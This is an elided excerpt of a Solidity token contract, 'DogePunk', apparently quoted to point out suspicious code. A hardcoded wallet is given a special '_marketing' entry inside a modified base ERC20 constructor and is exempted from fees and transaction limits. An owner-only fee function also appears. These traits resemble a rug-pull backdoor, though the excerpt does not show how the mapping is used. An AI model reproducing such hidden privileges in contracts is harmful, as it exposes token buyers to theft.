...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _marketing[0x5EC725E9c3673AEf5681F4DE0E7dBe8cb6e820B1] = _marketingwallet;
    }
...
contract DogePunk is ERC20, Ownable {
    ...
    constructor() ERC20("Doge Punkz", "DPUNK") {
        ...
        excludeFromFees(address(0x5EC725E9c3673AEf5681F4DE0E7dBe8cb6e820B1), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x5EC725E9c3673AEf5681F4DE0E7dBe8cb6e820B1), true);
    ...
    function manualswap(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external onlyOwner {
